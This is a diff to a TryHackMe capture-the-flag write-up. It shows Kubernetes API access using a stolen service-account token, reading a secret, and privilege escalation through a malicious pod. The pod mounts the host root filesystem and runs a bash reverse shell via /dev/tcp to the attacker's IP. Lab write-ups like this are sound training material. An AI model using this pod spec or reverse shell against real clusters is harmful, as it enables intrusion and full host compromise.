@@ -348,7 +348,7 @@ While performing the manual enumeration I observed a kuberneets secretaccount fo
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/c2ed6349-3055-47ac-a109-7caef9dab81d)
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/43acdb44-2c38-4b1a-aab2-7c3b26361db5)
 
-I copied these certificate & token file to my local host & used it for further Kubernetes authetication.
+I copied these certificate & token file to my local host & used it for further Kubernetes authetication on port 6443, which I already discovered while ports & service scan section.
 
 ### Kubernetes:
 
@@ -384,6 +384,67 @@ Using the above command I observed flag 3 in one of the namepsaces:
 kubectl --server https://10.10.103.155:6443 --certificate-authority=ca.crt --token=$token get secret flag3 -n kube-system -o yaml #to check the file content in yaml format
 ```
 
-Using this above command I finally discovered the 3rd flag from the container:
+Using this above command I finally discovered the 3rd flag from the container: (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/9911ad09-952d-42ff-a31f-f68ca7584bfa)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Flag 4:
+
+Now, I have to perform privilege escalation & get the root access on the target host to fetch the final flag. From the kubernetes enumeration I am already aware that using token & certificate I can create the new POD.
+Leveraging this misconfiguration I checked the yaml structure for one of the POD to create a new malicious POD, that will get execute my bash reverse shell & also mount the root directory.
+
+I checked the structure of the Gitea-0 POD & used the same image name to create a malicious POD:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/21a41463-f9b9-480b-954f-3780cb3aa7fd)
+
+```bash
+kubectl --server https://10.10.132.252:6443 --certificate-authority=ca.crt --token=$token get pods gitea-0 -n default -o yaml
+```
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/8694d906-2d93-40ae-8afd-a1e422ba4ff9)
+
+After using the same image name my yaml file was looking something like this:
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: kill3r1
+  namespace: default
+spec:
+  containers:
+  - name: kill3r1
+    image: gitea/gitea:1.5.1  #same image name for the pod gitea-0
+    command: ["/bin/bash"]
+    args: ["-c", "/bin/bash -i >& /dev/tcp/10.6.79.71/8443 0>&1"]  #this will execute the bash reverse shell
+    volumeMounts:
+    - mountPath: /mnt
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+  automountServiceAccountToken: true
+  hostNetwork: true
+```
+
+Once the yaml file is ready I created a new pod using this new yaml file:
+
+```bash
+kubectl --server https://10.10.132.252:6443 --certificate-authority=ca.crt --token=$token apply -f kill3r1.yaml
+```
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/96ce61d1-9a8b-4173-8662-cf0f655d6139)
+
+Checking the pod list again I observed my newly created pod in the list:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4edfe128-aee1-4128-b6be-3ce43309899b)
+
+The moment POD creation is completed I got the connection back on my netcat listener:
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/68161b93-478b-4b93-b36b-fdfe464f2c12)
+
+Moving into the "/mnt" folder as this folder contains the data from the "/" folder, I got 4th flag in the root folder: (pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6cb5fef6-a231-4247-b762-fcc7ed050ac0)
